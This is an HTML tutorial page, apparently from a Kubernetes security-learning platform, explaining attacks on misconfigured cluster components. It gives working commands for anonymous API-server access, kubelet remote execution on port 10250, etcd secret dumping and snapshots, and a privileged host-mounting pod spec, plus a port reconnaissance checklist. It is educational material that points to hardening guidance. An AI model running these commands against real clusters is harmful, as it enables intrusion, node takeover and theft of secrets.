@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>K09: Misconfigured Cluster Components - Attack Vectors</title>
+    <link rel="stylesheet" href="/platform/frontend/js/dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .doc-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .back-nav {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 20px;
+            margin-bottom: 30px;
+            color: var(--primary-color);
+            text-decoration: none;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+
+        .back-nav:hover {
+            background-color: rgba(245, 158, 11, 0.1);
+            border-color: var(--primary-color);
+            box-shadow: none;
+        }
+
+        .content {
+            background: var(--card-bg);
+            border-radius: 8px;
+            padding: 40px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 10px rgba(245, 158, 11, 0.1);
+        }
+
+        .content h1 {
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--primary-color);
+            text-shadow: none;
+        }
+
+        .content h2 {
+            color: var(--secondary-color);
+            font-size: 1.8rem;
+            margin-top: 40px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .content h3 {
+            color: var(--primary-color);
+            font-size: 1.4rem;
+            margin-top: 30px;
+            margin-bottom: 12px;
+        }
+
+        .content h4 {
+            color: var(--secondary-color);
+            font-size: 1.2rem;
+            margin-top: 25px;
+            margin-bottom: 10px;
+        }
+
+        .content p {
+            color: var(--text-color);
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+
+        .content ul, .content ol {
+            margin-left: 25px;
+            margin-bottom: 15px;
+            color: var(--text-color);
+        }
+
+        .content li {
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .content code {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 2px 8px;
+            border-radius: 4px;
+            color: var(--primary-color);
+            font-family: 'Courier New', monospace;
+            border: 1px solid var(--border-color);
+        }
+
+        .content pre {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 20px 0;
+            border: 1px solid var(--primary-color);
+            box-shadow: none;
+        }
+
+        .content pre code {
+            background: none;
+            padding: 0;
+            border: none;
+            color: var(--primary-color);
+        }
+
+        .content blockquote {
+            border-left: 4px solid var(--primary-color);
+            padding-left: 20px;
+            margin: 20px 0;
+            background: rgba(245, 158, 11, 0.05);
+            padding: 15px 20px;
+            border-radius: 4px;
+        }
+
+        .content table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            border: 1px solid var(--border-color);
+        }
+
+        .content table th {
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.2), rgba(251, 191, 36, 0.2));
+            color: var(--primary-color);
+            padding: 12px;
+            text-align: left;
+            border: 1px solid var(--border-color);
+        }
+
+        .content table td {
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+        }
+
+        .content table tr:hover {
+            background: rgba(245, 158, 11, 0.05);
+        }
+
+        .content a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .content a:hover {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+
+        .content strong {
+            color: var(--secondary-color);
+            font-weight: 600;
+        }
+
+        .toc {
+            background: rgba(245, 158, 11, 0.05);
+            border: 1px solid var(--primary-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .toc h2 {
+            color: var(--primary-color);
+            margin-top: 0;
+            border-bottom: 2px solid var(--primary-color);
+            padding-bottom: 10px;
+        }
+
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+
+        .toc li {
+            margin-bottom: 8px;
+        }
+
+        .toc a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .toc a:hover {
+            color: var(--primary-color);
+        }
+
+        .toc a:before {
+            content: "▸";
+            color: var(--primary-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="doc-container">
+        <a href="/learn/kubernetes" class="back-nav">
+            <i class="fas fa-arrow-left"></i> Back
+        </a>
+
+        <div class="content">
+            <h1>K09: Misconfigured Cluster Components - Attack Vectors</h1>
+
+<div class="toc">
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#understanding">Understanding Component Attack Vectors</a></li>
+<li><a href="#core-attack-flow">Core Attack Flow</a></li>
+<li><a href="#common-attack-patterns">Common Attack Patterns</a></li>
+<li><a href="#chaining">Chaining Component Misconfigurations</a></li>
+</ul>
+</div>
+
+<h2 id="understanding">Understanding Component Attack Vectors</h2>
+
+<blockquote>
+<p><strong>⚠️ EDUCATIONAL PURPOSE ONLY</strong> &mdash; the techniques below are shown so you can find and fix these issues in clusters you own or are authorised to test. Probing someone else's control plane is an intrusion.</p>
+</blockquote>
+
+<p>Attacking misconfigured components is rarely about a crafted exploit. It is about <strong>reaching a control surface and asking it politely</strong>. Because Kubernetes components authenticate and authorize <em>themselves</em>, a single knob left at an insecure value&mdash;anonymous auth, <code>AlwaysAllow</code>, a plaintext etcd port&mdash;means the surface answers to anyone who can route a packet to it. The attacker's whole job becomes discovery plus a well-formed request.</p>
+
+<p>The attacker's goal in this category is usually one of:</p>
+<ul>
+<li>Reach an API server, kubelet, or etcd that does not require real authentication or authorization.</li>
+<li>Turn that reach into <strong>code execution</strong> (kubelet <code>/exec</code>), <strong>secret theft</strong> (etcd, kubelet env), or <strong>scheduling power</strong> (create pods on any node).</li>
+<li>Harvest a service-account token from an executed container and pivot back to the API server to spread.</li>
+</ul>
+
+<h3 id="core-attack-flow">Core Attack Flow</h3>
+
+<pre><code>1. Discover
+   &darr;
+   Scan for open control-plane / node ports:
+   6443 (apiserver)  10250/10255 (kubelet)  2379/2380 (etcd)
+   10257 (controller-mgr)  10259 (scheduler)
+2. Probe authN/authZ
+   &darr;
+   Hit each surface anonymously; see what it answers
+   (anonymous-auth? AlwaysAllow? no client cert on etcd?)
+3. Exploit
+   &darr;
+   kubelet /exec, etcd get --prefix, create a pod, read Secrets
+4. Escalate / Pivot
+   &darr;
+   Steal service-account tokens, reach cloud metadata,
+   move to other nodes, own the cluster</code></pre>
+
+<h2 id="common-attack-patterns">Common Attack Patterns</h2>
+
+<h3>1. Anonymous / Over-Permissive API Server</h3>
+
+<p>If the API server accepts anonymous requests and authorization is loose, the built-in <code>system:anonymous</code> user can act.</p>
+
+<pre><code># Ask the API server who it thinks you are, unauthenticated:
+curl -sk https://TARGET:6443/api/v1/namespaces/default/pods
+
+# If --anonymous-auth=true AND authorization is permissive:
+HTTP/1.1 200 OK        # pods listed with no credentials
+
+# The single most damaging legacy case, the insecure port:
+curl http://TARGET:8080/api/v1/secrets   # no TLS, no auth, no authz</code></pre>
+
+<p><strong>Payoff</strong>: with <code>--insecure-port</code> or <code>AlwaysAllow</code>, the anonymous caller is effectively cluster-admin&mdash;read Secrets, create workloads, done.</p>
+
+<h3>2. Unauthenticated Kubelet Code Execution (port 10250)</h3>
+
+<p>A kubelet with <code>anonymous.enabled: true</code> and <code>authorization.mode: AlwaysAllow</code> exposes its full API. List pods, then run commands inside one.</p>
+
+<pre><code># Enumerate pods the node is running:
+curl -sk https://NODE:10250/pods | jq '.items[].metadata.name'
+
+# Execute a command inside a chosen container:
+curl -sk -X POST \
+  "https://NODE:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt;" \
+  -d "cmd=id"
+# -> uid=0(root) ... command runs inside the container</code></pre>
+
+<p><strong>Payoff</strong>: direct remote code execution on the node's workloads&mdash;then read every mounted Secret and service-account token from inside.</p>
+
+<h3>3. Read-Only Kubelet Port Disclosure (port 10255)</h3>
+
+<p>The read-only port has no authentication by design; if it is enabled, it volunteers cluster detail.</p>
+
+<pre><code>GET http://NODE:10255/pods     # full pod specs: images, env vars, mounts
+GET http://NODE:10255/metrics  # workload + node telemetry
+GET http://NODE:10255/spec     # node/cAdvisor spec
+
+# Environment variables in pod specs frequently contain
+# tokens, connection strings, and injected secrets.</code></pre>
+
+<p><strong>Payoff</strong>: no code execution needed&mdash;secrets and internal topology leak straight out of the pod specs.</p>
+
+<h3>4. Exposed etcd Dumping All Secrets</h3>
+
+<p>etcd without client-certificate auth is the cluster's whole state, readable in one command.</p>
+
+<pre><code># Plaintext / no-mTLS etcd on 2379:
+etcdctl --endpoints=http://TARGET:2379 get / --prefix --keys-only
+
+# Pull a specific Secret straight from the store:
+etcdctl --endpoints=http://TARGET:2379 \
+  get /registry/secrets/kube-system/admin-token --print-value-only
+
+# Or steal a snapshot and read it offline:
+etcdctl --endpoints=http://TARGET:2379 snapshot save cluster.db</code></pre>
+
+<p><strong>Payoff</strong>: every Secret in the cluster&mdash;database passwords, TLS keys, tokens&mdash;especially where encryption-at-rest is not configured.</p>
+
+<h3>5. Scheduling a Malicious Pod via a Reachable API Server</h3>
+
+<p>If the reachable API server authorizes pod creation, the attacker schedules their own workload&mdash;typically a privileged pod that mounts the host.</p>
+
+<pre><code>POST /api/v1/namespaces/default/pods
+{
+  "spec": {
+    "containers": [{
+      "name": "x", "image": "alpine",
+      "command": ["/bin/sh","-c","sleep 1d"],
+      "securityContext": { "privileged": true },
+      "volumeMounts": [{ "name": "h", "mountPath": "/host" }]
+    }],
+    "volumes": [{ "name": "h", "hostPath": { "path": "/" } }]
+  }
+}
+# chroot /host  ->  full node compromise</code></pre>
+
+<p><strong>Payoff</strong>: node takeover via a host-mounting privileged pod&mdash;the API server did the scheduling for them.</p>
+
+<h3>6. Exposed Component Metrics and Debug Endpoints</h3>
+
+<p>Scheduler, controller-manager, and kubelet metrics/profiling bound to all interfaces leak internals and, with profiling, allow resource abuse.</p>
+
+<pre><code>GET http://apiserver:6443/debug/pprof/     # if --profiling=true
+GET http://scheduler:10259/metrics         # scheduling internals
+GET http://controller:10257/metrics        # controller state
+GET http://NODE:10255/metrics              # kubelet telemetry</code></pre>
+
+<p><strong>Payoff</strong>: reconnaissance of cluster topology and workload names, plus profiling endpoints that can be driven to exhaust resources.</p>
+
+<h3>7. Missing Admission Plugins Enabling Node Impersonation</h3>
+
+<p>Without <code>NodeRestriction</code>, a stolen node/kubelet credential can modify objects beyond its own node.</p>
+
+<pre><code># With a node credential but NO NodeRestriction admission plugin:
+# the node can label/patch OTHER nodes and read pods it should not,
+# widening a single-node compromise into a cluster-wide one.</code></pre>
+
+<p><strong>Payoff</strong>: a one-node foothold becomes lateral movement across the cluster because the guardrail that scopes node identities was never enabled.</p>
+
+<h3>8. Missing / Weak mTLS Between Components</h3>
+
+<p>Disabled or unverified TLS between the API server and kubelets (or etcd) allows interception and impersonation.</p>
+
+<pre><code>--kubelet-certificate-authority   unset  -> API server does NOT verify
+                                            the kubelet it talks to
+etcd --peer-client-cert-auth=false        -> peers not authenticated
+Self-signed, never-rotated certs          -> a leaked key is valid forever</code></pre>
+
+<p><strong>Payoff</strong>: man-in-the-middle of control-plane traffic, or impersonation of a component whose certificate was never verified.</p>
+
+<h3>9. Disabled Audit Hiding the Attack</h3>
+
+<p>With no audit policy, none of the requests above are recorded.</p>
+
+<pre><code># --audit-log-path unset:
+#   kubelet /exec, etcd dumps, pod creation -> no server-side record
+#   defenders cannot scope the breach; attacker operates unseen</code></pre>
+
+<p><strong>Payoff</strong>: not an entry point but a force multiplier&mdash;the attacker's actions leave no trail, so detection and response fail.</p>
+
+<h2 id="chaining">Chaining Component Misconfigurations</h2>
+
+<p>Individually these are serious; chained, they are total cluster compromise with no application bug involved:</p>
+
+<pre><code>Open kubelet 10250 (anon + AlwaysAllow)
+        -> /exec into a pod, read its service-account token
+        +
+Token is a real ServiceAccount with broad RBAC
+        -> use it against the API server (K03 overlap)
+        +
+No NodeRestriction / no PodSecurity admission
+        -> schedule a privileged host-mounting pod on every node
+        =  root on all nodes, all Secrets, full takeover</code></pre>
+
+<p>Another common chain, starting from the datastore:</p>
+
+<pre><code>etcd on 2379 without mTLS
+        -> dump /registry/secrets, no encryption-at-rest
+        +
+One Secret is a cloud credential / kubeconfig
+        -> authenticate to the API server as an admin
+        +
+Audit disabled
+        -> the entire operation leaves no record</code></pre>
+
+<h2>Attacker's Reconnaissance Checklist</h2>
+
+<table>
+<thead>
+<tr><th>Port</th><th>Component</th><th>What the attacker checks</th></tr>
+</thead>
+<tbody>
+<tr><td>6443</td><td>kube-apiserver</td><td>Anonymous access, insecure port, permissive authZ</td></tr>
+<tr><td>8080</td><td>apiserver (legacy)</td><td>Insecure port bound = no-auth cluster-admin</td></tr>
+<tr><td>10250</td><td>kubelet</td><td>Anonymous + AlwaysAllow = /exec code execution</td></tr>
+<tr><td>10255</td><td>kubelet read-only</td><td>Unauthenticated pod specs, env vars, metrics</td></tr>
+<tr><td>2379 / 2380</td><td>etcd client / peer</td><td>No mTLS = dump every Secret</td></tr>
+<tr><td>10257 / 10259</td><td>controller-mgr / scheduler</td><td>Exposed metrics, profiling, health on all interfaces</td></tr>
+</tbody>
+</table>
+
+<h2>Key Takeaways</h2>
+
+<ol>
+<li><strong>Components authenticate themselves</strong>&mdash;a single insecure knob (anonymous auth, <code>AlwaysAllow</code>, plaintext etcd) opens the door with no exploit.</li>
+<li><strong>The kubelet is a direct RCE surface</strong>&mdash;an open <code>10250</code> means running commands inside your containers.</li>
+<li><strong>etcd is one command from every Secret</strong>&mdash;without mTLS and encryption-at-rest, the whole cluster's credentials leak at once.</li>
+<li><strong>Small foothold + missing admission plugins = lateral movement</strong>&mdash;<code>NodeRestriction</code> and <code>PodSecurity</code> are the guardrails that contain a single-node compromise.</li>
+<li><strong>Disabled audit blinds the defender</strong>&mdash;it turns an incident into an invisible one.</li>
+</ol>
+
+<h2>Next Steps</h2>
+
+<ul>
+<li><strong><a href="prevention.html">Prevention Guide</a></strong>: Harden every component and verify with the CIS Benchmark</li>
+<li><strong><a href="examples.html">Code Examples</a></strong>: Insecure vs. hardened component configuration</li>
+<li><strong><a href="/learn/kubernetes">Kubernetes Learning Path</a></strong>: Continue with the rest of the Kubernetes Top 10</li>
+<li><strong><a href="/practice">Practice</a></strong>: Apply these concepts hands-on</li>
+</ul>
+
+        </div>
+    </div>
+</body>
+</html>
